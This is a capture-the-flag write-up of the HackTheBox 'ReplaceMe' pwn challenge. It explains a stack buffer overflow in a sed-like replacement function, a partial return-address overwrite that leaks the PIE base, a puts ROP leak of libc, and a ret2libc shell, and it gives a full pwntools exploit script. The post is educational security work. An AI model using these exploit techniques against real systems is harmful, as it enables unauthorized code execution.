---
title: "HTB: Replaceme Pwn Writeup"
date: 2026-03-09
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "hackthebox"
  - "htb"
  - "binary exploitation"
  - "reverse-engineering"
---

This week for my weekly pwn writeup series, I have another medium level challenge from hackthebox: <https://app.hackthebox.com/challenges/ReplaceMe?tab=play_challenge>. Again I will say this, it was a quite entertaining and informative challenge. Let's start with a first look.

## First Look

I always start with a checksec to see what I am dealing with:

![Checksec](/assets/img/replaceme_checksec.png)

Okay not too bad, almost all flags are enabled other than the stack canary. I will ignore SHSTK and IBT flags, I don't think they will be doing anything in this medium level challenge. If you want to see how I panicked the first time I saw those flags, have a look at this writeup: <https://yusuftas.net/posts/htb-portaloo-writeup/>

Looking at ghidra, there is not many functions that we need to investigate:

![Functions](/assets/img/replaceme_functions.png)

After looking at decompilation output, there was only one function that we need to deal with: do_replacement. Other functions didn't seem to have any bugs or issues we can make use of. I tried to clean the output in Ghidra a bit to make it easy to read:

```c++

void do_replacement(void)

{
  size_t leftovers_in_input;
  char out_arr [132];
  int leftovers;
  char *out_arr_p;
  long old_inp_p;
  int new_len;
  undefined1 *end_slash_p;
  int old_len;
  char *mid_slash_p;
  undefined *old_p;
  
  out_arr[0] = '\0';
  out_arr[1] = '\0';
  out_arr[2] = '\0';
  out_arr[3] = '\0';
  out_arr[4] = '\0';
  out_arr[5] = '\0';
  out_arr[6] = '\0';
  out_arr[7] = '\0';
  out_arr[8] = '\0';
  out_arr[9] = '\0';
  out_arr[10] = '\0';
  out_arr[0xb] = '\0';
  out_arr[0xc] = '\0';
  out_arr[0xd] = '\0';
  out_arr[0xe] = '\0';
  out_arr[0xf] = '\0';
  out_arr[0x10] = '\0';
  out_arr[0x11] = '\0';
  out_arr[0x12] = '\0';
  out_arr[0x13] = '\0';
  out_arr[0x14] = '\0';
  out_arr[0x15] = '\0';
  out_arr[0x16] = '\0';
  out_arr[0x17] = '\0';
  out_arr[0x18] = '\0';
  out_arr[0x19] = '\0';
  out_arr[0x1a] = '\0';
  out_arr[0x1b] = '\0';
  out_arr[0x1c] = '\0';
  out_arr[0x1d] = '\0';
  out_arr[0x1e] = '\0';
  out_arr[0x1f] = '\0';
  out_arr[0x20] = '\0';
  out_arr[0x21] = '\0';
  out_arr[0x22] = '\0';
  out_arr[0x23] = '\0';
  out_arr[0x24] = '\0';
  out_arr[0x25] = '\0';
  out_arr[0x26] = '\0';
  out_arr[0x27] = '\0';
  out_arr[0x28] = '\0';
  out_arr[0x29] = '\0';
  out_arr[0x2a] = '\0';
  out_arr[0x2b] = '\0';
  out_arr[0x2c] = '\0';
  out_arr[0x2d] = '\0';
  out_arr[0x2e] = '\0';
  out_arr[0x2f] = '\0';
  out_arr[0x30] = '\0';
  out_arr[0x31] = '\0';
  out_arr[0x32] = '\0';
  out_arr[0x33] = '\0';
  out_arr[0x34] = '\0';
  out_arr[0x35] = '\0';
  out_arr[0x36] = '\0';
  out_arr[0x37] = '\0';
  out_arr[0x38] = '\0';
  out_arr[0x39] = '\0';
  out_arr[0x3a] = '\0';
  out_arr[0x3b] = '\0';
  out_arr[0x3c] = '\0';
  out_arr[0x3d] = '\0';
  out_arr[0x3e] = '\0';
  out_arr[0x3f] = '\0';
  out_arr[0x40] = '\0';
  out_arr[0x41] = '\0';
  out_arr[0x42] = '\0';
  out_arr[0x43] = '\0';
  out_arr[0x44] = '\0';
  out_arr[0x45] = '\0';
  out_arr[0x46] = '\0';
  out_arr[0x47] = '\0';
  out_arr[0x48] = '\0';
  out_arr[0x49] = '\0';
  out_arr[0x4a] = '\0';
  out_arr[0x4b] = '\0';
  out_arr[0x4c] = '\0';
  out_arr[0x4d] = '\0';
  out_arr[0x4e] = '\0';
  out_arr[0x4f] = '\0';
  out_arr[0x50] = '\0';
  out_arr[0x51] = '\0';
  out_arr[0x52] = '\0';
  out_arr[0x53] = '\0';
  out_arr[0x54] = '\0';
  out_arr[0x55] = '\0';
  out_arr[0x56] = '\0';
  out_arr[0x57] = '\0';
  out_arr[0x58] = '\0';
  out_arr[0x59] = '\0';
  out_arr[0x5a] = '\0';
  out_arr[0x5b] = '\0';
  out_arr[0x5c] = '\0';
  out_arr[0x5d] = '\0';
  out_arr[0x5e] = '\0';
  out_arr[0x5f] = '\0';
  out_arr[0x60] = '\0';
  out_arr[0x61] = '\0';
  out_arr[0x62] = '\0';
  out_arr[99] = '\0';
  out_arr[100] = '\0';
  out_arr[0x65] = '\0';
  out_arr[0x66] = '\0';
  out_arr[0x67] = '\0';
  out_arr[0x68] = '\0';
  out_arr[0x69] = '\0';
  out_arr[0x6a] = '\0';
  out_arr[0x6b] = '\0';
  out_arr[0x6c] = '\0';
  out_arr[0x6d] = '\0';
  out_arr[0x6e] = '\0';
  out_arr[0x6f] = '\0';
  out_arr[0x70] = '\0';
  out_arr[0x71] = '\0';
  out_arr[0x72] = '\0';
  out_arr[0x73] = '\0';
  out_arr[0x74] = '\0';
  out_arr[0x75] = '\0';
  out_arr[0x76] = '\0';
  out_arr[0x77] = '\0';
  out_arr[0x78] = '\0';
  out_arr[0x79] = '\0';
  out_arr[0x7a] = '\0';
  out_arr[0x7b] = '\0';
  out_arr[0x7c] = '\0';
  out_arr[0x7d] = '\0';
  out_arr[0x7e] = '\0';
  out_arr[0x7f] = '\0';
  if ((replacement != 's') || (replacement[1] != '/')) {
    error("Missing \'s/\' at the beginning of the replacement string.");
  }
  old_p = &old_part;
  mid_slash_p = (char *)find(&old_part,&fwd_slash,0x80);
  if (mid_slash_p == (undefined1 *)0x0) {
    error("Missing \'/\' in between old and new.");
  }
  old_len = (int)mid_slash_p - (int)old_p;
  *mid_slash_p = 0;
  mid_slash_p = mid_slash_p + 1;
  end_slash_p = (undefined1 *)find(mid_slash_p,&fwd_slash,0x80);
  if (end_slash_p == (undefined1 *)0x0) {
    error("Missing \'/\' after the replacement.");
  }
  new_len = (int)end_slash_p - (int)mid_slash_p;
  *end_slash_p = 0;
  old_inp_p = find(input,old_p,0x80);
  if (old_inp_p == 0) {
    error("Could not find old string in input.");
  }
  else {
    out_arr_p = out_arr;
    leftovers_in_input = strlen((char *)(old_inp_p + old_len));
    leftovers = (int)leftovers_in_input;
    memcpy(out_arr_p,input,old_inp_p - 0x104040);
    out_arr_p = out_arr_p + old_inp_p + -0x104040;
    memcpy(out_arr_p,mid_slash_p,(long)new_len);
    out_arr_p = out_arr_p + new_len;
    if (0 < leftovers) {
      memcpy(out_arr_p,(void *)(old_len + old_inp_p),(long)leftovers);
    }
    success("Thank you! Here is the result:");
    fputs(out_arr,stdout);
  }
  return;
}
```

It is a sed like string replacement utility function. It takes two strings from user input and replacement string where replacement string should follow the sed replacement style: s/old/new/. And then first instance of old in the input string will be replaced by new. I think this is the first time in my challenge series that I am given a proper looking program. Previously others were more like purposefully broken binaries. Now this one on the other hand, is more like a real application with a purpose. Let's first summarize how the replacement works:

1. Replacement string should follow the sed style:  s/old/new/  so the binary checks for thats. Does it start with s/, does it end with / etc. And the extract old and new string positions from the given string by finding /. This is actually important because old and new is decided on position of / in the replacement string.
2. Search old string in the input 
3. If found construct the result in three copies:
  * Copy everything from input before match to out_arr
  * Copy new string into out_arr
  * And then finally if there is any leftover after match copy into out_arr

For example, let's say the input is  AAABCCCC and replacement is s/B/GGG/. Old string matching position is 3rd index in input, anything before that (AAA) is copied into out_arr, then new string is copied (GGG) and then leftovers (CCCC) are copied. So we get AAAGGGCCCC result. 

Looking at user input, there doesn't seem to be a buffer overflow. However looking at copying logic and how it is applied at the end, we can see that **none of the memcpy operations are protected by checking if the out_arr have enough capacity to contain the result.** This is the buffer overflow we need to exploit! Let's consider this example to make it more tangibl, input is B followed by 100A,  and replacement is B replaced by 100A. What will happen when we execute this? B is replaced by 100A and then followed by copying leftoever 100A which gives us 200A as a result. This is much larger than the allocated output buffer! So it will overflow and possibly crash. 

Looking at the code, I couldn't identify any other bug. So we are given a buffer overflow only and we need to construct properly designed inputs to overflow the buffers. But what is the target here? Looking at security flags, we got PIE, full relro etc. So we don't know code address space, we don't know libc address (ASLR), we can't overwrite GOT. We can overflow the buffer but we don't know where to go, and we don't have a leak yet. 

Well technically there is a leak at the end of the do_replacement function where it prints the resulting out_arr. Since we can overflow and control the result array with our malicious inputs, this printing will probably leak some stuff. But if we can't redirect code to the beginning, we can't make use of this leak since the program finishes after that. Let's see how we can do some small jumps without knowing PIE base to redirect the code.

## Leaking PIE base

### Small jumps

PIE is a tricky thing to deal with, but there is a small catch. **Due to page-level randomization, the base address of a PIE binary typically ends in 000 (e.g., 0x555555554000)** What does this mean for us? Regardless of how random PIE is, first 12 bits / 3 nibbles of the addresses will not change at all. For example main is currently at 0x0010164e in the code, so when it runs it will be at some random address 0xXXXXXXXXX64e. If we can overwrite the byte 0x4e with the overflow, we can change return address. This gives us a 256 or so bytes range in total to go around the actual return address. Not much, but it can be enough to go back to a point where we can provide inputs again. Technically 12 bits of the address don't change, so if we could provide half byte we could go around more before touching the PIE address bits but we can't do that. Worst case scenario is we can override two bytes which should gives us 1/16 chance to guess the 4 random bits. Sometimes you use whatever is given to you and 1/16 is not too bad if there is a possibility of RCE at the end. Okay let's not go into a tangent, spoilers this binary doesn't require 1/16 chance to guess second byte, one byte is enough. Let's do some debugging by breaking at *do_replacement+602 to see where it is returning to:

```
Looking at call stack after a couple of runs:

 ► 0   0x563cd9744606 do_replacement+602
   1   0x563cd97446be main+112

 ► 0   0x55837ada4606 do_replacement+602
   1   0x55837ada46be main+112

 ► 0   0x55a02c1f9606 do_replacement+602
   1   0x55a02c1f96be main+112

```

As you can see, address for main+112 is different for each run but 6be is always there. **And luckily for us instead of returning to main+112, returning to main+0 only requires single byte change:  0x55a02c1f96be -> 0x55a02c1f964e .** That means just by overflowing into the first byte of return address, we can change return address from main+112 to main without knowing PIE base.

### Offset to Return Address

Now we have a plan, we need to figure out the offset from the out_arr to the return address to know how much we need to buffer overflow. Normal people use cyclic patterns and stuff to figure out the offset properly, I'm not like them. I kind of use a bit of intiution and estimation to figure out by trial and error. I find Ghidra's stack display very helpful: 

![Stack](/assets/img/replaceme_stack.png)

Looking at positions in the stack, output array is at -0xc8 (200) and return address is at zero. **This gives me an estimate of 200 bytes offset**. This means if we can generate 200 bytes of output, next byte should reach to the first byte of return address, the byte we need to overwrite to return to main+0. 

### Generating Output

Next step is to generate 200 bytes of output. Since we figured out how replacement works, there are three ways to approach this:

1. RAApayload s/R/AA/   replacing at the beginning of input
2. ARApayload s/R/AA/   replacing at the middle of input
3. AAR  s/R/AApayload/  replacing at the end of input

If you generate the outputs of all these options, you will see that they all generate the same output: AAAApayload. Imagine the AAAA as the 200 bytes of A we need for padding for the overflow followed by the payload bytes. They all generate the same output but the way we provide the payload changes. We will touch this point later on in the writeup, but keep in mind where payload goes and if it can have null bytes or certain bytes that could break the replacement logic. 

### Leaking 

I went ahead with 3rd way of generating output, it just seemed more appropriate. For this part of the solution, any of the ways above should work since they all generate same output, and we are only using one byte overflow that it shouldn't break replacement logic. 

```python
def leakPIE(io):
    # This payload should generate an output of A * 200 which should be 
    # enough to reach RIP, next byte update in Input should leak into RIP 
    payload_replace = b's/B/' + b'A' * 100 + b'/'
    payload_input   = b'B' + b'A' * 100

    # Update return pointer part from main+112 to main+0
    # This will change last 3 nibbles from 6be to 64e so only a single byte change
    updated_rip = b'\x4e'    

    io.recvuntil(b'Input: ')
    io.send(payload_input + updated_rip)

    io.recvuntil(b'Replacement: ')
    io.send(payload_replace) 

    io.recvuntil(b'result:')
    io.recvline()

    just_a = io.recv(200)
    pie_leak = io.recvn(6)
    pie_leak = u64(pie_leak.ljust(8, b'\x00')) 

    print(hex(pie_leak))

    return pie_leak

leaked_main = leakPIE(io)

# Calculate the base of the PIE and store it in elf
pie_base = leaked_main - elf.symbols['main']
elf.address = pie_base
print(hex(pie_base))

```

Since we needed to generate 200 bytes, I separated them into 2x100 bytes to be able to fit them into input and replacement arrays. Rest of the function is pretty straightforward. Send the input and replacement, and then read the output. But why should this leak PIE base? Looking at the code again, we see that at the end out array is printed:

```c++
    success("Thank you! Here is the result:");
    fputs(out_arr,stdout);
```

This call will print the out_arr until null. Since we generated out_arr to be 200A + 0x4e there is no null byte to stop printing. What comes after 0x4e? Rest of the return address! So this should print 200A + 0x4e + rest of return address and stop at the next final 0x00 bytes. I think there is a small chance that this address will contain a null byte in the middle which would stop printing the full address, in that case this will fail and you will just need to rerun it. Also note that since we overwrite the return address, this will print main+0 not main+112.

## Leaking LIBC base

Great, we now should have PIE base figured out and the execution should go back to the beginning. Since now we have PIE base, we should be able to return to more spaces in the code if we need to build a ROP chain for example. To be able to return to libc to get a shell, we now need to figure out the base address of LIBC since it is randomized due to ASLR. Logic for leaking the libc is a generic ROP chain:

1. Target one of the GOT entries, let's say puts. Its offset is stored in GOT
2. Find pop rdi gadget to store that offset entry in RDI
3. Build the ROP chain to call puts PLT to print the offset
4. And then finally return back to main again

This is a classic text book approach to leaking a libc address to figure out the base:

```python
    rop = ROP(elf)
    puts_plt_call   = elf.plt['puts']
    puts_offset     = elf.got['puts']
    poprdi_ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]

    # Build the ROP chain to print puts offset value from GOT
    payload = payload_replace
    payload += p64(poprdi_ret_addr) + p64(puts_offset)
    payload += p64(puts_plt_call)
    payload += p64(elf.symbols['main'])
```

Now if you try to run this with the previous way of generating output, you will start getting some issues. Let's have a look at the replacement copying logic one more time:

![Replacement logic](/assets/img/replaceme_replacement.png)

Here the binary calculates how many leftover bytes after replacement left in the input which is used in third memcpy. First memcpy copies bytes from input until the start of the old string, second memcpy copies the new replacement string and third one finally copies the leftover bytes. Let's look at the bytes from previous section to see how these operations go one by one. 

    payload_replace = b's/B/' + b'A' * 100 + b'/'
    payload_input   = b'B' + b'A' * 100 + b'\x43'


1. Input was B + 100A + 0x43
2. Replace = s/B/100A/ so old = B new = 100A
3. leftovers is calculated = 101 bytes (100A + 0x43) 
4. Copy until old string -> nothing is copied, no extra bytes until start of old string
5. Copy new string 100A into output array -> no overflow yet
6. Copy leftovers into output array - now we overflow the variables in stack including one byte of return address.

Now if we were to follow same approach to do the ROP chain, instead of overflowing ony byte 0x43 we need to send these bytes for example (based on a random run's PIE address):

* 0x0000562a5726c733 -> pop rdi ret gadget in the binary
* 0x0000562a5726ef98 -> Puts offset from GOT 
* 0x0000562a5726c0e4 -> Puts from PLT
* 0x0000562a5726c64e -> To return back to main

Now imagine we put these bytes to leftover part of the input as we did above : 

    payload_input   = b'B' + b'A' * 100 + b'\x0000562a5726c7330000562a5726ef98.........'

And the length of the leftovers is calculated with `strlen` which will stop at null byte! Now I hope you start to see the picture I am painting. strlen will stop counting the extra bytes we put, due to null bytes in addresses. So we will end up copying less than we provide. **So for this reason, we can't use the leftover part of the input to provide the payload!!**

Other option is to provide the payload through replacement. The reason is length of the replacement is calculated as the difference between two / positions. Since strlen isn't used this won't break the length calculation of replacement. Let's have a look at how this works on an example:


    payload_replace = b's/B/' + b'A' * 76 + ROP_bytes(32 bytes as shown in example above)
    payload_input   = b'A' * 124 + b'B'

I did a little bit of change to swap some bytes around. With the ROP chain being 32 bytes, I couldn't provide it with 100 bytes padding, so took some bytes from there and moved to input side. Now since we are providing the payload bytes in replacement, replacement of the old string has to take place at the end of input string so that final overflowing bytes will be the ROP chain. 

This is looking good, but we now have a different problem to deal with. Check out the stack layout one more time. If you look closely, output array is not at the end of stack where the overflow goes straight to return address. There are quite a few local variables stored in the stack between output array and return address. One of these variables is used to store how many bytes left over in input for the third memcpy call. Now, with this new approach, overflow happens at the second memcpy call which is used to copy new string into out array. If the overflow happens before the local variable for leftover bytes is used, it will overflow that variable and the binary will crash. To be able to handle this, we need to set that local variable to its expected value in the overflow bytes to make the code run smoothly. In this instance, we don't have any extra bytes after replacement in the input, so we need to set it to 0. After a bit of trial and error, I found the offset to that variable in the stack and set it to zero in payload:

```python
def leakLIBC(io, elf, libc):
    # This payload should generate an output of A * 200 which should be 
    # enough to reach RIP, next byte update in Input should leak into RIP 
    payload_replace = b's/B/' + b'A' * 8 + p64(0) + b'A' * 60
    payload_input   = b'A' * 124 + b'B'

    # Call puts function from PLT. We need it to print puts' GOT to leak a libc address.
    # This requires a ROP gadget
    rop = ROP(elf)
    puts_plt_call   = elf.plt['puts']
    puts_offset     = elf.got['puts']
    poprdi_ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]

    # Build the ROP chain to print puts offset value from GOT
    payload = payload_replace
    payload += p64(poprdi_ret_addr) + p64(puts_offset)
    payload += p64(puts_plt_call)
    payload += p64(elf.symbols['main'])
    payload += b'/'    # Follow the SED style with ending slash

    io.recvuntil(b'Input: ')
    io.send(payload_input)

    io.recvuntil(b'Replacement: ')
    io.send(payload) 

    # This is expected result, so we receive enough bytes to come to the leak
    # b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe0\xbb\x91\x9d\xca\x7f\nWelcome'
    io.recvuntil(b'A' * 132)  

    # Now receive the leaked puts 
    puts_recv = io.recvline().strip(b'\n')
    puts_addr = u64(puts_recv.ljust(8, b'\x00'))
    print(puts_recv)

    # libc base is the difference between them
    libc_base = puts_addr - libc.symbols['puts']

    return libc_base

libc.address = leakLIBC(io, elf, libc)
print(hex(libc.address))
```

## Time to Shell

We now have two critical information we need: PIE base and libc base. We should be able to return to libc and ROP around to get a shell. This part is pretty straight forward, classic return to libc:

1. Find system call from libc
2. Find /bin/sh string in libc
3. Store /bin/sh in RDI with a ROP gadget
4. Call system 

I actually want to put a little note here. I was using my local libc during my investigations. And by some random chance /bin/sh string's address contained 0x2F ('/') byte. I was getting errors and issues and took me a while to realize **0x2F, forward slash is used to locate new and old string positions. It was breaking the replacement logic.** So if you end up like me while debugging using local libc version, take a look at your libc addresses. This issues doesn't happen with the supplied libc version.

Other than this, getting the shell was the easiest part. You can see the implementation in the final code section down below.

## Final Code

```python
from pwn import *

# Set up pwntools for the correct architecture
exe = './replaceme'

context.binary = exe
elf  = ELF(exe)
libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu']
# context.log_level = 'debug'


def getShell(io, elf, libc):
    # This payload should generate an output of A * 200 which should be 
    # enough to reach RIP, next byte update in Input should leak into RIP 
    payload_replace = b's/B/' + b'A' * 8 + p64(0) + b'A' * 60
    payload_input   = b'A' * 124 + b'B'

    rop = ROP(elf)
    poprdi_ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]    

    system = libc.symbols['system']
    binsh  = next(libc.search(b'/bin/sh'))

    payload = payload_replace
    payload += p64(poprdi_ret_addr) + p64(binsh)
    payload += p64(system)
    payload += b'/'    # Follow the SED style with ending slash

    io.recvuntil(b'Input: ')
    io.send(payload_input)

    io.recvuntil(b'Replacement: ')
    io.send(payload) 


def leakLIBC(io, elf, libc):
    # This payload should generate an output of A * 200 which should be 
    # enough to reach RIP, next byte update in Input should leak into RIP 
    payload_replace = b's/B/' + b'A' * 8 + p64(0) + b'A' * 60
    payload_input   = b'A' * 124 + b'B'

    # Call puts function from PLT. We need it to print puts' GOT to leak a libc address.
    # This requires a ROP gadget
    rop = ROP(elf)
    puts_plt_call   = elf.plt['puts']
    puts_offset     = elf.got['puts']
    poprdi_ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]

    # Build the ROP chain to print puts offset value from GOT
    payload = payload_replace
    payload += p64(poprdi_ret_addr) + p64(puts_offset)
    payload += p64(puts_plt_call)
    payload += p64(elf.symbols['main'])
    payload += b'/'    # Follow the SED style with ending slash

    print(hex(poprdi_ret_addr))
    print(hex(puts_offset))
    print(hex(puts_plt_call))
    print(hex(elf.symbols['main']))

    io.recvuntil(b'Input: ')
    io.send(payload_input)

    io.recvuntil(b'Replacement: ')
    io.send(payload) 

    # This is expected result, so we receive enough bytes to come to the leak
    # b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe0\xbb\x91\x9d\xca\x7f\nWelcome'
    io.recvuntil(b'A' * 132)  

    # Now receive the leaked puts 
    puts_recv = io.recvline().strip(b'\n')
    puts_addr = u64(puts_recv.ljust(8, b'\x00'))
    print(puts_recv)

    # libc base is the difference between them
    libc_base = puts_addr - libc.symbols['puts']

    return libc_base


def leakPIE(io):
    # This payload should generate an output of A * 200 which should be 
    # enough to reach RIP, next byte update in Input should leak into RIP 
    payload_replace = b's/B/' + b'A' * 100 + b'/'
    payload_input   = b'B' + b'A' * 100

    # Update return pointer part from main+112 to main+0
    # This will change last 3 nibbles from 6be to 64e so only a single byte change
    updated_rip = b'\x4e'    

    io.recvuntil(b'Input: ')
    io.send(payload_input + updated_rip)

    io.recvuntil(b'Replacement: ')
    io.send(payload_replace) 

    io.recvuntil(b'result:')
    io.recvline()

    just_a = io.recv(200)
    pie_leak = io.recvn(6)
    pie_leak = u64(pie_leak.ljust(8, b'\x00')) 

    print(hex(pie_leak))

    return pie_leak


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *do_replacement+495
b *do_replacement+602
'''.format(**locals())

# Local
io = start()

# io = remote('154.57.164.83', 31328)

leaked_main = leakPIE(io)

# Calculate the base of the PIE and store it in elf
pie_base = leaked_main - elf.symbols['main']
elf.address = pie_base
print(hex(pie_base))

# Now do another round of buffer overflow to leak libc base
libc.address = leakLIBC(io, elf, libc)
print(hex(libc.address))

getShell(io, elf, libc)

io.interactive()
```

Overall another fun pwn challenge, I enjoyed it toroughly. Analyzing a proper utility function and trying to find attack vectors made this feel more real than other mock examples. Also this challenge was a combination of different attack approaches in a textbook way. Trying to overcome issues and going around the stack to generate the required output was challenging but very informative. I think this post again ended up much longer than I anticipated, I don't want to extend this further than it already is. Hopefully I can manage to keep this challenge going, as always keep learning!

